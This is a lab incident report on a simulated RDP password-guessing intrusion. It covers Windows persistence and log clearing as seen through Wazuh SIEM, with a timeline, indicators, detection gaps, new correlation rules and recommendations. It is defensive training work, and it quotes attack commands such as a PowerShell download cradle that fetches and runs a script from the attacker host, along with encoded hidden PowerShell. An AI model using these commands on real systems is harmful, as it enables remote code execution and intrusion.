# Incident Report IR-01: RDP Password Guessing to Persistence and Log Clearing

[← Back to README](../README.md) · Exercise 17

| | |
|---|---|
| **Status** | Closed (contained and eradicated) |
| **Severity** | High: attacker obtained local administrator access, created persistence and destroyed local logs |
| **Date of incident** | 12 Nov 2026, 09:45–09:59 (UTC+2) |
| **Affected host** | DESKTOP-RUN6GAL (Wazuh agent `win11-victim`, 10.10.10.129) |
| **Attacker** | 10.10.10.130 |
| **Accounts** | `rdptest` (compromised), `svc-update` (created by the attacker) |
| **Detection source** | Wazuh SIEM (Windows Security, Sysmon, PowerShell 4104) |
| **Analyst** | Abdullah Azhar |

> This is a lab exercise. The intrusion was simulated with harmless payloads on an isolated network so it could be investigated end to end from the SIEM alone.

## 1. Executive summary

An attacker at 10.10.10.130 guessed the password of the helpdesk account `rdptest` in four attempts, logged in over RDP and, because the account was a local administrator, took full control of the workstation. Within 14 minutes the attacker ran discovery commands, executed hidden (base64-encoded) PowerShell, downloaded and ran a script from his own server, created three persistence mechanisms, turned off PowerShell logging and cleared the Windows Security log.

Wazuh raised level 10–12 alerts for 9 of the 15 attack steps, but **the initial access (password guessing and RDP login) only raised level 5–6 alerts**, because the built-in brute-force rule needs 8 failures in 4 minutes. The local evidence was destroyed twice (log cleared, then overwritten by log rollover), yet **every event was still in the SIEM**. The host was contained at 10:34 and cleaned at 10:35. Two new rules and one rule fix now raise this same intrusion as a single **level 15 incident**.

## 2. Timeline

Times are Wazuh manager time, UTC+2 (UTC in brackets). The endpoint clock was ~37 s ahead of the manager and the attacker (see section 7).

| Time | Event | Evidence (rule, level) | MITRE |
|---|---|---|---|
| 09:45:46 (07:45:46) | Port scan of 10.10.10.129 finds 135, 445, 3389 open | none (attacker's own log only) | T1046 |
| 09:47:04 (07:47:04) | 4 failed logons for `rdptest` from 10.10.10.130 | 60122 ×4 (5) | T1110.001 |
| 09:47:04 (07:47:04) | Successful NTLM logon for `rdptest` in the same second: password `Summer2026!` guessed | 92652 (6) | T1078 |
| 09:47:45 (07:47:45) | Network logon type 3 (RDP Network Level Authentication) | 100500 (12) | T1021 |
| 09:47:46 (07:47:46) | RDP interactive logon `rdptest` from 10.10.10.130 | 101000 ×2 (6) | T1021.001 |
| 09:51:20 (07:51:20) | Discovery: `whoami`, `whoami /groups` (also `net user`, `net localgroup`, `ipconfig`, `systeminfo`, not alerted) | 100200 ×2 (10) | T1033, T1087.001, T1016, T1082 |
| 09:52:52 (07:52:52) | Hidden encoded PowerShell `-nop -w hidden -enc` by `rdptest` | 101300 (12) | T1059.001, T1027.010 |
| 09:56:04 (07:56:04) | `IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.130:8000/stage2.ps1')`, script writes `C:\Users\Public\ex17-marker.txt` | 101310 (12) | T1105 |
| 09:57:32 (07:57:32) | Run key `HKCU\...\CurrentVersion\Run\WindowsUpdateHelper` | 91844 (12) | T1547.001 |
| 09:57:33 (07:57:33) | Scheduled task `Exercise17Updater` | 100400 (12) | T1053.005 |
| 09:57:33 (07:57:33) | Backdoor user `svc-update` created and added to Administrators | 100100 (12), 60109 (8), 60154 (12) | T1136.001, T1098 |
| 09:58:34 (07:58:34) | PowerShell Script Block Logging set to 0 | 101330 (12) | T1562.002 |
| 09:58:34 (07:58:34) | Security log cleared (Event 1102) | 100930 (12) | T1070.001 |
| 09:59:21 (07:59:21) | Attacker logs off | attacker's own log | |
| 10:34:49* | Containment: both accounts disabled, RDP and its firewall rule off | analyst | |
| 10:35:43* | Eradication: task, marker file, both accounts and the `rdptest` profile (with the Run keys) removed; Script Block Logging restored | analyst | |

\* Endpoint clock.

Full alert list for the window (105 alerts of level 5 or higher): [evidence/ex17-alert-timeline.txt](evidence/ex17-alert-timeline.txt).

## 3. Attack narrative

**Initial access.** RDP (3389) was reachable from the attacker's network. A four-word password list was enough: `Summer2026!` is a season-plus-year password. NLA checks the password before a desktop opens, so the guesses appear as network logons (Event 4625 type 3) followed by a successful NTLM logon in the same second.

**Privilege.** `rdptest` was a member of the local Administrators group, so no privilege escalation was needed: the attacker was an administrator from the first second (`nxc` reported `Pwn3d!`).

**Execution and tool transfer.** The attacker hid a PowerShell command with `-EncodedCommand`, then used a classic in-memory download cradle to fetch and run `stage2.ps1` from 10.10.10.130:8000. Script Block Logging (enabled in Exercise 16) recorded the decoded code.

**Persistence.** Three independent mechanisms, so that removing one is not enough: a per-user Run key, a daily scheduled task and a second administrator account.

**Defense evasion.** The attacker switched off Script Block Logging for future PowerShell sessions and cleared the Security log before logging off.

## 4. Indicators of compromise

| Type | Value |
|---|---|
| IP address | 10.10.10.130 |
| URL | `http://10.10.10.130:8000/stage2.ps1` |
| Compromised account | `rdptest` (local administrator) |
| Attacker-created account | `svc-update` (local administrator) |
| Registry | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdateHelper` = `cmd.exe /c echo Exercise17` |
| Scheduled task | `Exercise17Updater` (daily 09:00, `cmd.exe /c echo Exercise17`) |
| File | `C:\Users\Public\ex17-marker.txt` |
| Tools seen | nmap, NetExec (`nxc rdp`), FreeRDP (`xfreerdp3`), Python `http.server` |

## 5. Root cause

1. **Guessable password** (`Summer2026!`) on an account reachable from the network.
2. **Excessive privilege:** a helpdesk account was a local administrator.
3. **RDP exposed** to the attacker's network, with no MFA and no source restriction.
4. **Detection gap:** the brute-force rule needs 8 failures in 240 s from one IP, so a short, targeted guess list stayed below it.

## 6. Detection coverage

| Result | Steps |
|---|---|
| Detected at level 10 or higher (9) | whoami, encoded PowerShell, download cradle, Run key, scheduled task, backdoor user, Administrators change, logging disabled, log cleared |
| Detected only at level 5–6 (2) | password guessing (60122 L5, 92652 L6), RDP login (101000 L6) |
| Not detected (4) | port scan, `net user` / `net localgroup`, `ipconfig` / `systeminfo`, marker file |

**Findings**

- **Brute-force threshold:** rule 60204 needs `MS_FREQ` = 8 failures in 240 s from the same IP. Four guesses never reached it, so the custom correlation rule 101010 (built on 60204) never fired.
- **Run key rule too narrow:** custom rule 100300 was a child of 92302, which only matches `reg.exe`. The attacker used PowerShell; Sysmon logged the change (Event 13, `T1060,RunKey`) but no custom alert fired. The Run key was caught only by 91844, a PowerShell 4104 rule, so detection depended on Script Block Logging, which the attacker could have turned off first.
- **Highest alert was a false positive:** the only level 15 alerts (92213) were `msedge.exe` unpacking a DLL into the new user's Temp folder.
- **Noise:** 71 of the 105 alerts (68%) were unrelated (Windows Update 92219 ×49, 92217 ×19, Edge 92213 ×2, Windows Search). The dashboard widgets "Authentication failure" and "Authentication success" showed 0 at level 10+.

## 7. Evidence preservation

- **The attacker cleared the Security log** (Event 1102, 09:58).
- **The log then overwrote itself:** the Security log is capped at 20 MB, and File System auditing (enabled for FIM whodata) wrote 25,668 records in about 18 minutes. When checked at 10:17 the oldest record was from 10:09, so the Event 1102 itself was already gone.
- **The SIEM kept everything:** the failed and successful logons (4625/4624), the account creation (4720) and the group change (4732) were all still in Wazuh, because the agent forwards events in real time.
- **Clock skew:** the endpoint clock was ~37 s ahead of the Wazuh manager and the attacker host (Kali logged the download at 09:56:04; the endpoint wrote 09:56:41 inside the same script). This timeline uses manager time.

## 8. Response

| Time* | Action |
|---|---|
| 10:34:49 | Disabled `rdptest` and `svc-update`; confirmed no attacker session (`quser`); disabled RDP and its firewall rule |
| 10:35:43 | Deleted task `Exercise17Updater` and the marker file; restored Script Block Logging to 1; deleted `svc-update` and `rdptest` and removed the `rdptest` profile (which held the Run keys) |
| 10:36 | Verified: no attacker accounts, task gone, profile gone, logging on, Sysmon and Wazuh agent running |

\* Endpoint clock.

## 9. Detection improvements made

| Change | What it does | Validated |
|---|---|---|
| **101020** (new, L12) | RDP logon (101000) after **any** failed logon (60122) from the same IP within 300 s | Re-attack with 4 guesses: fired ×2 at 10:30:49 |
| **100300** (fixed) | Parent changed from 92302 (reg.exe only) to 92300 + 92302 (any process); regex now requires `Run\` or `RunOnce\`, so `RunNotification` (written by `sihost.exe` at every logon) does not match | PowerShell Run key by `socadmin` raised 100300 |
| **101400** (new, L15) | Incident correlation: persistence (100100, 100300, 100400, 91844) within 3,600 s of a successful brute-force login (group `rdp_bruteforce_success`: 101010 or 101020) | Negative test: no 101400 without a brute force. Re-attack: 101400 fired ×2 at 10:31:53 |

The same four-guess intrusion that first produced only level 5–6 alerts for its entry point now produces 101020 (L12) and a level 15 incident.

## 10. Recommendations

1. **Remove local administrator rights** from helpdesk and support accounts; use separate admin accounts with just-in-time access.
2. **Protect RDP:** restrict it to a management network or VPN, require MFA, and block password-guessing with an account lockout lower than 10 and a strong password policy.
3. **Keep the new detections** (101020, 101400, fixed 100300) and review every rule that depends on a single tool or a high frequency threshold.
4. **Raise the Security log size** or narrow File System auditing, so the endpoint keeps more than ~10 minutes of history. Treat the SIEM as the only durable record.
5. **Synchronise endpoint clocks** (NTP) so endpoint and SIEM times match.
6. **Add a discovery-burst rule** (several of `net`, `whoami`, `ipconfig`, `systeminfo` from one user within a few minutes).
7. **Tune the noise** (92219 Windows Update, 92217, 92213 Edge unpacker) so real alerts stand out.

## 11. Lessons learned

- **Low-and-slow beats thresholds.** A rule that needs 8 failures is blind to an attacker who needs 4. Correlate "failure followed by success" instead of counting failures alone.
- **Test rules with more than one tool.** A Run key rule written for `reg.exe` missed PowerShell; one detection layer (4104) hid the gap in another (Sysmon).
- **Severity is not priority.** The only level 15 alerts were a browser updating itself; the attacker's entry was level 5–6.
- **Local logs are not evidence you can count on.** They were cleared by the attacker and overwritten by normal activity within minutes. The SIEM copy made this investigation possible.

## 12. Follow-up status (Exercise 18)

| Recommendation | Status |
|---|---|
| 1–2. Admin rights and RDP exposure | Lab accounts removed and RDP disabled during eradication |
| 3. Keep the new detections | ✅ 101020, 101400 and the fixed 100300 kept; 100300 now ignores only Edge's own startup-boost value (101560, level 3), proven by a negative test |
| 4. Larger Security log | ✅ 20 MB → 200 MB |
| 5. NTP on the endpoint | ✅ Windows Time synced to `time.windows.com` (it was using the local CMOS clock) |
| 6. Discovery-burst rule | ⏳ Open |
| 7. Tune the noise | ✅ 92219 and 92217 (Windows Update) suppressed, 92213 Edge unpacker suppressed; see [04-tuning.md](04-tuning.md) |

